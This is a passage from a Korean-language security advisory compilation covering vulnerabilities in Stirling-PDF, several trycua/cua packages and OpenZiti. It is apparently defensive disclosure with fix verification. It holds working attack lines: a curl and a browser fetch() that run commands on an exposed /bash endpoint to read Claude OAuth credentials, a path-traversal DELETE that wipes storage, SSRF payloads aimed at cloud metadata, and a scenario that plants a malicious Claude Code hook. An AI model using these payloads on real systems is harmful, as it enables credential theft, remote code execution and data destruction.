command.add(URL);
command.add("--pdf-forms");
command.add("--allowed-protocols");
command.add("data,http,https"); // 버그 2: WeasyPrint 하위 프로세스에 http/https 요청을 그대로 허용함!
```
결과적으로 공격자가 공개 웹페이지 URL을 제출하면 최상위 URL 검사는 통과하지만, 그 HTML 안에 `<link rel="stylesheet" href="http://127.0.0.1:8080/secrets.css">`나 클라우드 메타데이터(`169.254.169.254`)를 넣어두면 **Java의 SSRF 방어를 거치지 않는 WeasyPrint 프로세스가 직접 내부 서버에 접속하여 응답을 PDF 문서 안에 렌더링해 공격자에게 반환**합니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 클라우드 환경의 영수증/웹페이지 PDF 변환 기능에서 클라우드 IAM 자격 증명 탈취:**
  1. 사내 포털이나 SaaS 서비스가 외부 웹페이지를 PDF로 변환하기 위해 `/api/v1/convert/url/pdf`를 호출합니다.
  2. 공격자가 제출한 외부 웹페이지 내 `<link>` 또는 `<object>`가 클라우드 메타데이터 API(`169.254.169.254`)나 로컬 설정 엔드포인트를 참조합니다.
  3. WeasyPrint가 내부 응답을 가져와 생성된 PDF 페이지에 그대로 찍어주어 공격자가 PDF를 다운로드해 IAM 키를 획득합니다.
* **시나리오 B — `SsrfProtectionService`를 우회하여 Kubernetes / Docker 내부 마이크로서비스 스캔 및 조회:**
  1. Stirling-PDF 컨테이너와 동일한 Pod 또는 내부 서브넷에서 Spring Boot Actuator(`http://127.0.0.1:8080/actuator/env`)나 Prometheus(`http://10.0.0.12:9090/metrics`)가 실행 중입니다.
  2. 외부 HTML 내부의 `@import url("http://127.0.0.1:8080/...")`를 통해 WeasyPrint가 내부 엔드포인트 데이터를 PDF로 유출합니다.
* **시나리오 C — HTTP `302` 리다이렉트를 이용한 방화벽 내부 관리 대시보드 PDF 캡처:**
  1. 외부 HTML의 `<img src="https://attacker.example/redir">`가 내부 인트라넷 주소로 `302` 리다이렉트를 반환하여 내부 화면을 PDF로 유출합니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. ConvertWebsiteToPDF.java의 --allowed-protocols 설정 소스 확인
grep -n -C 12 "allowed-protocols" /path/to/Stirling-PDF/app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java

# 2. 로컬 루프백(127.0.0.1) 기반 격리 E2E 검증 테스트 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_stirling_cand01 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN`):**
```json
{
  "RED": {
    "weasyprint_allowed_protocols": "data,http,https",
    "internal_subresource_fetched": true,
    "internal_data_embedded_in_pdf": true,
    "internal_loopback_hit_count": 1
  },
  "GREEN": {
    "weasyprint_allowed_protocols": "data",
    "internal_subresource_fetched": false,
    "internal_data_embedded_in_pdf": false,
    "internal_loopback_hit_count": 0
  }
}
```

---

### III.03 — TryCua `cuabot` (`<= 1.0.16`) — 비인증 `0.0.0.0:7842` 데몬 + `POST /bash` 와일드카드 CORS + 오리진 미검증 WebSocket + 쓰기 가능한 호스트 `.claude` 마운트 (`GHSA-cp36-x5hg-3gg8`, `CWE-306`/`CWE-942`, CVSS `9.6 Critical`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `trycua/cua` (`npm: cuabot <= 1.0.16`)
* **영향받는 버전 & 컴포넌트:** `>= 1.0.1, <= 1.0.16` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cuabot/src/cuabotd.ts` (`34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120`행)
* **취약점 분류 & 점수:** `CWE-306` (중요 기능에 대한 인증 누락) / `CWE-942` (과도하게 허용적인 교차 도메인 화이트리스트) — **CVSS v3.1: `9.6 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`)
* **GitHub GHSA 링크:** `GHSA-cp36-x5hg-3gg8` (`https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/ko/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
`cuabot`의 백그라운드 데몬인 `cuabotd.ts`에는 네 가지 치명적인 결함이 동시에 결합되어 있습니다:
1. **모든 네트워크 인터페이스(`0.0.0.0:7842`)에 비인증 바인딩:** `server.listen(port, ...)`(`1120`행)에 호스트 지정이 없어 `0.0.0.0:7842`로 열리며 어떠한 인증 토큰도 요구하지 않습니다.
2. **모든 응답에 `Access-Control-Allow-Origin: *` 설정:**
   ```typescript
   // libs/cuabot/src/cuabotd.ts:967-974
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') {
     res.writeHead(200);
     res.end();
     return;
   }
   ```
3. **임의 명령을 실행하는 `POST /bash` 및 `Origin`을 확인하지 않는 WebSocket 터미널:** `/bash`는 전달된 `command`를 그대로 실행해 출력을 반환하며, `WebSocketServer`(`741`행)는 오리진 검증 없이 PTY 세션을 생성합니다.
4. **호스트의 `.claude` 자격 증명 디렉터리 읽기/쓰기 마운트:** 호스트의 `~/.cuabot/user/.claude`를 `/home/community-user/.claude`로 쓰기 가능하게 마운트합니다(`259-260`행).

이로 인해 개발자가 `cuabot`을 실행한 상태에서 브라우저로 아무 웹페이지나 열기만 해도 페이지 내 JavaScript가 `http://localhost:7842/bash`를 호출해 명령을 실행하고 Claude OAuth 자격 증명을 탈취할 수 있습니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 웹 브라우징 중 드라이브바이(Drive-By) 교차 출처 RCE 및 Claude OAuth 자격 증명 탈취:**
  1. 개발자가 `npx cuabot`을 실행한 채 브라우저에서 외부 블로그나 문서 사이트를 방문합니다.
  2. 웹페이지의 JS가 `fetch("http://localhost:7842/bash", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({command: "cat /home/community-user/.claude/.credentials.json"})})`를 호출합니다.
  3. `Access-Control-Allow-Origin: *` 덕분에 브라우저가 응답을 허용하여 Claude OAuth 액세스/리프레시 토큰이 공격자에게 즉시 전송됩니다.
* **시나리오 B — 쓰기 가능한 `/home/community-user/.claude/settings.json`에 영구 `PreToolUse` 훅을 주입하여 호스트 OS 침해:**
  1. 악성 웹페이지가 `POST /bash` 또는 `ws://localhost:7842/?command=bash`(CSWSH)를 통해 `/home/community-user/.claude/settings.json`을 수정합니다.
  2. 설정 파일의 `hooks.PreToolUse`에 악성 셸 명령을 등록하여 이후 호스트에서 Claude Code를 실행할 때마다 백도어 명령이 실행되도록 만듭니다.
* **시나리오 C — 카페, 공유 오피스 또는 사무실 Wi-Fi(`0.0.0.0:7842`)에서 동일 네트워크 기기의 직접 장악 및 화면 캡처:**
  1. 동일 Wi-Fi의 공격자가 `http://<개발자IP>:7842/screenshot`으로 화면을 실시간 감시하고 `POST /bash`로 워크스테이션을 장악합니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. 로컬 격리 테스트 환경에서 교차 출처(Origin: https://evil.example) 요청 재현
curl -i -X POST http://127.0.0.1:7842/bash \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"command":"id && cat /home/community-user/.claude/.credentials.json"}'

# 2. Sniper E2E 자동 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand01 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "http_status": 200,
    "access_control_allow_origin": "*",
    "driveby_bash_executed": true,
    "mounted_host_claude_credentials_exfiltrated": true
  },
  "GREEN": {
    "http_status": 403,
    "driveby_bash_executed": false,
    "mounted_host_claude_credentials_exfiltrated": false,
    "error": "Cross-origin browser requests forbidden"
  },
  "BENIGN": {
    "http_status": 200,
    "stdout": "authorized_cli_ok"
  }
}
```

---

### III.04 — TryCua `cua-bench-rl` (`<= 0.1.0`) — `0.0.0.0:8001` 워커 서버 와일드카드 CORS + Fail-Open `OSGYM_ALLOWED_IPS` + 비인증 `POST /reset` 임의 모듈 실행 (`GHSA-xm8w-gj3g-4f25`, `CWE-94`/`CWE-942`, CVSS `8.8 High`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `trycua/cua` (`pip: cua-bench-rl <= 0.1.0` 및 `cua-bench <= 0.3.1`)
* **영향받는 버전 & 컴포넌트:** `<= 0.1.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py` (`79-108, 338-360, 499`행) 및 `libs/cua-bench/cua_bench/core.py` (`make`, `25-51`행)
* **취약점 분류 & 점수:** `CWE-94` (코드 생성의 부적절한 제어) / `CWE-942` (과도하게 허용적인 교차 도메인 화이트리스트) — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **GitHub GHSA 링크:** `GHSA-xm8w-gj3g-4f25` (`https://github.com/trycua/cua/security/advisories/GHSA-xm8w-gj3g-4f25`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/ko/04-CUA-CAND-02-WORKER-SERVER-RCE.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
강화학습 워커 서버 `worker_server.py`는 접근 제어를 위해 `ip_filter_middleware`를 사용하지만 다음 세 가지 버그가 겹쳐 있습니다:
```python
# libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py:79-105
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # 버그 1: 모든 외부 웹사이트의 브라우저 교차 출처 요청 허용!
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.middleware("http")
async def ip_filter_middleware(request: Request, call_next):
    allowed_ips = os.environ.get("OSGYM_ALLOWED_IPS", "127.0.0.1").split(",")
    allowed_ips = [ip.strip() for ip in allowed_ips if ip.strip()]
    client_ip = request.client.host if request.client else None
    # 버그 2: 로컬 브라우저에서 http://127.0.0.1:8001로 보낸 요청은 client_ip == "127.0.0.1"이므로 통과됨!
    # 버그 3: OSGYM_ALLOWED_IPS="" (빈 문자열)일 때 allowed_ips가 []가 되어 `if allowed_ips:`가 False로 평가되며 모든 원격 IP에 개방됨!
    if allowed_ips and client_ip not in allowed_ips:
        return JSONResponse(status_code=403, content={"detail": f"Access denied for IP: {client_ip}"})
    return await call_next(request)
```
그리고 `POST /reset` 핸들러는 전달받은 `env_path`를 `cua_bench.core.make(req.env_path)`(`core.py:38-51`)에 넘기는데, 이 함수는 `<env_path>/main.py` 파일을 찾아 **`spec.loader.exec_module(module)`로 호스트 Python 프로세스에서 즉시 실행**합니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 로컬에서 RL 워커를 실행 중인 연구원이 웹페이지를 열었을 때 드라이브바이 `exec_module` RCE 발생:**
  1. 연구원이 워크스테이션에서 `worker_server.py`를 띄워둔 채 브라우저로 웹페이지를 엽니다.
  2. 웹페이지가 로컬 다운로드 폴더를 가리키는 `fetch("http://127.0.0.1:8001/reset", {method: "POST", body: JSON.stringify({env_path: "/tmp/untrusted_env", task_index: 0})})`를 실행하여 호스트에서 임의의 Python 코드를 실행하고 GPU 서버의 SSH 키와 토큰을 탈취합니다.
* **시나리오 B — Kubernetes / Docker Compose 배포에서 `OSGYM_ALLOWED_IPS=""` 빈 값 설정으로 인한 클러스터 전체 비인증 RCE:**
  1. 배포 매니페스트에서 `OSGYM_ALLOWED_IPS=""`가 빈 문자열로 설정되면 `if allowed_ips:`가 `False`가 되어 필터가 완전히 무력화(Fail-Open)됩니다.
  2. 클러스터나 LAN의 아무 호스트나 `0.0.0.0:8001/reset`을 호출해 원격 코드를 실행합니다.
* **시나리오 C — 비인증 `/screenshot` 및 `/step` 호출을 통한 화면 감시 및 입력 주입:**
  1. 공격자가 `GET /screenshot`으로 실시간 데스크톱 화면을 수집하고 `POST /step`으로 키보드/마우스 동작을 주입합니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. 로컬 격리 환경에서 교차 출처 POST /reset 재현
curl -i -X POST http://127.0.0.1:8001/reset \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"env_path":"/tmp/poc_env","task_index":0}'

# 2. Sniper E2E 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand02 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "cross_origin_reset_status": 200,
    "empty_allowed_ips_remote_lan_status": 200,
    "arbitrary_env_path_exec_module_rce": true
  },
  "GREEN": {
    "cross_origin_reset_status": 403,
    "empty_allowed_ips_remote_lan_status": 403,
    "outside_env_path_status": 400,
    "arbitrary_env_path_exec_module_rce": false
  },
  "BENIGN": {
    "loopback_valid_task_reset_status": 200
  }
}
```

---

### III.05 — TryCua `cua-compat` (`<= 0.8.0`) — Daytona S3 멀티파트 `uploadId` 경로 탐색 및 무조건적인 `tokio::fs::remove_dir_all` 디렉터리 삭제 (`GHSA-3x8g-6h2v-8qx9`, `CWE-22`, CVSS `8.1 High`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `trycua/cua` (`Cargo: cua-compat <= 0.8.0` / `cua-spacesd <= 0.8.0`)
* **영향받는 버전 & 컴포넌트:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-compat/src/daytona/objectstore.rs` (`handle`, `320-325, 360-422`행)
* **취약점 분류 & 점수:** `CWE-22` (경로 탐색 / Path Traversal) — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`)
* **GitHub GHSA 링크:** `GHSA-3x8g-6h2v-8qx9` (`https://github.com/trycua/cua/security/advisories/GHSA-3x8g-6h2v-8qx9`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/ko/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
Daytona 호환 S3 객체 저장소(`objectstore.rs`)는 객체 키(`key`)에 대해서는 `object_path(&key)`로 `..`를 차단하지만, 쿼리 문자열에서 추출하는 **`?uploadId=` 매개변수에 대해서는 아무런 검증도 수행하지 않습니다**.

더구나 멀티파트 업로드를 취소하는 `HTTP DELETE` 핸들러(`415-421`행)는 다음과 같이 작성되어 있습니다:
```rust
// libs/cua/crates/cua-compat/src/daytona/objectstore.rs:415-421
(Method::DELETE, Some(id), _, _) => {
    d.objects.uploads.lock().await.remove(&id); // 버그 1: 해당 uploadId가 실제로 존재했는지 여부를 무시함!
    // 버그 2: 검증되지 않은 `id`를 경로에 결합하여 무조건 remove_dir_all 재귀 삭제를 실행함!
    let _ = tokio::fs::remove_dir_all(d.objects.root.join("uploads").join(&id)).await;
    Response::builder()
        .status(StatusCode::NO_CONTENT)
        .body(Full::new(Bytes::new()))
        .unwrap()
}
```
따라서 공격자는 멀티파트 업로드를 시작할 필요조차 없이 단 한 번의 `DELETE /daytona/anykey?uploadId=../objects` 요청만으로 `root.join("uploads").join("../objects")` 즉 **전체 객체 저장소(`<root>/objects`)를 통째로 삭제**할 수 있습니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 멀티테넌트 샌드박스 환경에서 단일 테넌트가 조직 전체의 샌드박스 이미지 저장소를 일괄 삭제:**
  1. 공유 `cua-spacesd` 서버를 사용하는 단일 샌드박스 테넌트가 `DELETE /daytona/x?uploadId=../objects`를 전송합니다.
  2. `tokio::fs::remove_dir_all`이 `<root>/objects/daytona`를 즉시 삭제하여 모든 테넌트의 샌드박스 이미지가 소실됩니다.
* **시나리오 B — 상위 경로 탐색(`?uploadId=../../...`)을 통한 호스트 애플리케이션 디렉터리 및 DB 삭제:**
  1. 공격자가 `?uploadId=../../state` 등을 전달하여 `d.objects.root` 외부의 호스트 디렉터리를 재귀 삭제합니다.
* **시나리오 C — `PUT ?partNumber=1&uploadId=../stage`를 통한 인접 애플리케이션 디렉터리 파일 오염:**
  1. `Method::PUT` 핸들러(`360-383`행)에서 `?partNumber=1&uploadId=../stage`를 사용해 `uploads/` 외부의 인접 디렉터리에 임의 파일을 기록합니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. 로컬 격리 테스트 환경에서 DELETE ?uploadId=../objects 재현
curl -i -X DELETE "http://127.0.0.1:9000/daytona/dummy-key?uploadId=../objects" \
  -H "Authorization: Bearer <push-token>"

# 2. Sniper E2E 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand03 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "delete_traversal_status": 204,
    "objects_store_wiped_without_prior_upload": true
  },
  "GREEN": {
    "delete_traversal_status": 400,
    "delete_uninitiated_id_status": 404,
    "objects_store_preserved": true
  },
  "BENIGN": {
    "valid_upload_abort_status": 204,
    "staging_dir_removed": true
  }
}
```

---

### III.06 — TryCua `cua-media-codec` (`<= 0.8.0`) — Safe Rust `VtEncoder::encode`에서 슬라이스 길이 미검증 `unsafe { copy_nonoverlapping }` 호출로 인한 힙 경계 밖 읽기 (`GHSA-54v9-fxw3-36mm`, `CWE-125`/`CWE-190`, CVSS `5.5 Medium`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `trycua/cua` (`Cargo: cua-media-codec <= 0.8.0`)
* **영향받는 버전 & 컴포넌트:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs` (`VtEncoder::encode` -> `pixel_buffer_for`, `308-420`행)
* **취약점 분류 & 점수:** `CWE-125` (경계 밖 읽기 / Out-of-Bounds Read) / `CWE-190` (정수 오버플로 또는 랩어라운드) — **CVSS v3.1: `5.5 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`)
* **GitHub GHSA 링크:** `GHSA-54v9-fxw3-36mm` (`https://github.com/trycua/cua/security/advisories/GHSA-54v9-fxw3-36mm`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/ko/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
Rust에서 `unsafe`가 붙지 않은 안전한 공개 함수(`pub fn encode(&mut self, frame: &VideoFrame)`)는 어떤 입력이 들어와도 메모리 안전성을 보장해야 합니다. 그러나 macOS VideoToolbox 하드웨어 인코더의 `pixel_buffer_for`(`308-420`행)는 입력 슬라이스(`y.len()`, `uv.len()`, `data.len()`)의 길이를 전혀 확인하지 않고 `unsafe { std::ptr::copy_nonoverlapping }`를 호출합니다:
```rust
// libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs:344-367
unsafe {
    let y_dst = CVPixelBufferGetBaseAddressOfPlane(pb, 0) as *mut u8;
    let y_dst_stride = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
    for row in 0..h {
        // 버그: y.len()이 row * (*y_stride as usize) + w 이상인지 전혀 확인하지 않음!
        std::ptr::copy_nonoverlapping(
            y.as_ptr().add(row * (*y_stride as usize)),
            y_dst.add(row * y_dst_stride),
            w,
        );
    }
```
전달된 프레임 버퍼가 `stride * height`보다 짧으면 `copy_nonoverlapping`는 버퍼 끝을 넘어 **인접한 힙 메모리(세션 토큰, 개인키 등)를 읽어 H.264 비디오 프레임에 복사한 뒤 원격 시청자에게 스트리밍**하거나 `SIGSEGV` 충돌을 일으킵니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — macOS 원격 데스크톱 스트리밍 해상도 변경 중 인접 힙 메모리 비밀 정보(`960`바이트)가 비디오 스트림으로 유출:**
  1. 원격 데스크톱 창 크기가 변경되는 과정에서 짧게 잘린 `FrameData::Nv12` 버퍼가 전달됩니다.
  2. `pixel_buffer_for`가 인접 힙 메모리의 `960`바이트를 읽어 H.264 비디오 프레임으로 인코딩하여 클라이언트로 전송합니다.
* **시나리오 B — 빈 슬라이스 또는 손상된 `VideoFrame` 입력으로 인한 `cua-spacesd` 데몬 `SIGSEGV` 충돌:**
  1. 빈 `y: &[]` 슬라이스를 가진 프레임이 전달되면 매핑되지 않은 메모리를 참조해 `cua-spacesd` 프로세스가 즉시 종료되고 모든 원격 세션이 끊어집니다.
* **시나리오 C — 다중 세션 미디어 프로세스에서 잘못된 `stride` 값으로 인한 타 세션 힙 데이터 유출:**
  1. 비정상적인 `y_stride` / `uv_stride` 산술로 인해 버퍼 경계를 넘어 동일 프로세스 내 다른 세션의 메모리를 읽습니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. videotoolbox/mod.rs 내 copy_nonoverlapping 구현 확인
sed -n '335,415p' /path/to/cua/libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs

# 2. Sniper E2E 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_vt01 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "oob_bytes_read": 960,
    "adjacent_heap_secret_copied_to_video_frame": true
  },
  "GREEN": {
    "oob_bytes_read": 0,
    "adjacent_heap_secret_copied_to_video_frame": false,
    "error": "CodecError::InvalidArgument"
  },
  "BENIGN": {
    "valid_frame_encoded_bytes": 1536
  }
}
```

---

### III.07 — TryCua `cua-bench` WinArena (`<= 0.3.1`) — 비인증 `0.0.0.0:8006`(noVNC) 및 무암호 `0.0.0.0:3390`(RDP) LAN 노출 + 쓰기 가능한 호스트 `/shared` 마운트 (`GHSA-hvhg-6x47-cq96`, `CWE-668`/`CWE-732`, CVSS `8.6 High`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `trycua/cua` (`pip: cua-bench <= 0.3.1`)
* **영향받는 버전 & 컴포넌트:** `<= 0.3.1` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench/tasks/winarena_adapter/cli.py` (`cmd_vm_setup`, `cmd_vm_start`, `cmd_task_run`, `262-265, 421-424, 646-649`행) 및 `infra/vm/setup/server/main.py` (`180-248, 290-321`행)
* **취약점 분류 & 점수:** `CWE-668` (잘못된 영역으로의 리소스 노출) / `CWE-732` (중요 리소스에 대한 부적절한 권한 할당) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`)
* **GitHub GHSA 링크:** `GHSA-hvhg-6x47-cq96` (`https://github.com/trycua/cua/security/advisories/GHSA-hvhg-6x47-cq96`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/ko/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
Docker 컨테이너를 시작할 때 `127.0.0.1:` 접두사 없이 `-p 8006:8006`을 전달하면 포트가 **`0.0.0.0`(호스트의 모든 Wi-Fi 및 이더넷 인터페이스)**에 바인딩되며, Linux `iptables`의 `DOCKER` 포워딩 체인을 통해 일반적인 `ufw` 입력 방화벽 규칙을 우회합니다.

WinArena 오케스트레이터(`cli.py:262-265, 421-424, 646-649`)의 세 가지 VM 실행 명령은 모두 다음과 같이 설정되어 있습니다:
```python
# libs/cua-bench/tasks/winarena_adapter/cli.py:261-266 (및 421-424, 646-649)
"-p", f"{args.browser_port}:8006", # 버그 1: 0.0.0.0:8006 -> 비인증 noVNC 웹 데스크톱을 전체 LAN에 노출!
"-p", f"{args.rdp_port}:3389",     # 버그 2: 0.0.0.0:3390 -> 무암호 Windows RDP를 전체 LAN에 노출!
"-v", f"{storage_path}:/storage",
"-v", f"{setup_path}:/shared",     # 버그 3: 호스트의 패키지 소스 디렉터리를 쓰기 가능(:rw)하게 마운트!
```
결과적으로 동일 네트워크의 누구나 비밀번호 없이 Windows VM 화면을 열고 제어할 수 있으며, VM 내부에서 `/shared` 마운트(호스트의 `winarena_adapter/infra/vm/setup` 디렉터리)에 있는 스크립트를 변조해 호스트 OS를 오염시킬 수 있습니다.

#### 3. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 대학 연구실 또는 기업 LAN에서 `0.0.0.0:8006`(noVNC) / `3390`(RDP)을 통한 Windows VM 및 API 키 탈취:**
  1. 연구원이 연구실/사무실 LAN에 연결된 워크스테이션에서 WinArena 벤치마크를 실행합니다.
  2. 동일 네트워크의 공격자가 브라우저에서 `http://<워크스테이션IP>:8006`에 접속해 인증 없이 Windows 데스크톱을 제어하고 벤치마크용 OpenAI / Anthropic API 키를 탈취합니다.
* **시나리오 B — 쓰기 가능한 `-v {setup_path}:/shared` 마운트를 통한 호스트 파일시스템 역오염:**
  1. 공격자가 장악한 VM 내부에서 `/shared` 마운트 내 호스트 설치 스크립트를 수정합니다.
  2. 호스트에서 다시 CLI를 실행하거나 해당 디렉터리를 참조할 때 호스트 OS에서 악성 코드가 실행됩니다.
* **시나리오 C — VM 내부 `0.0.0.0:5000` 제어 서버의 비인증 `POST /execute_windows`(`exec()`)를 통한 임의 명령 실행:**
  1. VM 내부에서 실행되는 `infra/vm/setup/server/main.py`(`180-248`행)는 인증 없이 `POST /execute_windows`(Python `exec()`) 및 `POST /setup/launch`(`shell=True`)를 노출하여 임의의 명령 실행을 허용합니다.

#### 4. 예제 실행, 재현 및 검증 명령어
```bash
# 1. cli.py 내 Docker 포트 바인딩 및 볼륨 마운트 코드 확인
sed -n '255,272p' /path/to/cua/libs/cua-bench/tasks/winarena_adapter/cli.py

# 2. Sniper E2E 검증 테스트(RED -> GREEN + BENIGN) 실행
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand06 -v
```
**관찰된 런타임 증명 출력 (`RED -> GREEN + BENIGN`):**
```json
{
  "RED": {
    "lan_exposed_ports": ["8006:8006", "3390:3389"],
    "host_setup_dir_mounted_writable": true,
    "host_setup_file_tampered_from_container": true
  },
  "GREEN": {
    "lan_exposed_ports": [],
    "loopback_bound_ports": ["127.0.0.1:8006:8006", "127.0.0.1:3390:3389"],
    "host_setup_dir_mounted_writable": false,
    "readonly_mount": true
  }
}
```

---

### III.08 — OpenZiti (`ziti` CLI) — `AreCertsTrusted` -> `InsecureClient`의 무조건적인 `InsecureSkipVerify: true` 설정으로 인한 TLS 인증서 검증 우회 (`GHSA-qwv8-hh9r-cqrf`, `CWE-295`, CVSS `7.4 High`)

#### 1. 메타데이터 & 공개 상태
* **대상 저장소 & 패키지:** `openziti/ziti` (`Go: github.com/openziti/ziti/v2`)
* **영향받는 버전 & 컴포넌트:** `v2.0.0-pre6` 이하 (`commit 08f09c510bb2673d3632419ba8d6e10002d5eb00`) — `ziti/util/certs.go` (`AreCertsTrusted` `91-103`행, `InsecureClient` `199-208`행) 및 `ziti/cmd/edge/login.go` (`319-390`행)
* **취약점 분류 & 점수:** `CWE-295` (부적절한 인증서 검증) — **CVSS v3.1: `7.4 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
* **GitHub GHSA 링크:** `GHSA-qwv8-hh9r-cqrf` (`https://github.com/openziti/ziti/security/advisories/GHSA-qwv8-hh9r-cqrf`)
* **Sniper 개별 권고 보고서:** [`docs/advisories/ko/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/ko/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)

#### 2. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (누구나 이해할 수 있는 단계별 설명)
관리자가 `ziti edge login`을 실행하면 CLI는 대상 컨트롤러의 TLS 인증서가 신뢰할 수 있는지 확인하기 위해 `AreCertsTrusted(host)`(`certs.go:91-103`)를 호출합니다.

개발자는 신뢰할 수 없는 인증서일 경우 `x509.UnknownAuthorityError`가 반환될 것이라 기대했지만, 내부에서 호출하는 `InsecureClient(&client, certs)`(`199-208`행)에 치명적인 버그가 있었습니다:
```go
// ziti/util/certs.go:91-103, 199-208
func AreCertsTrusted(host string, certs []*x509.Certificate) (bool, error) {
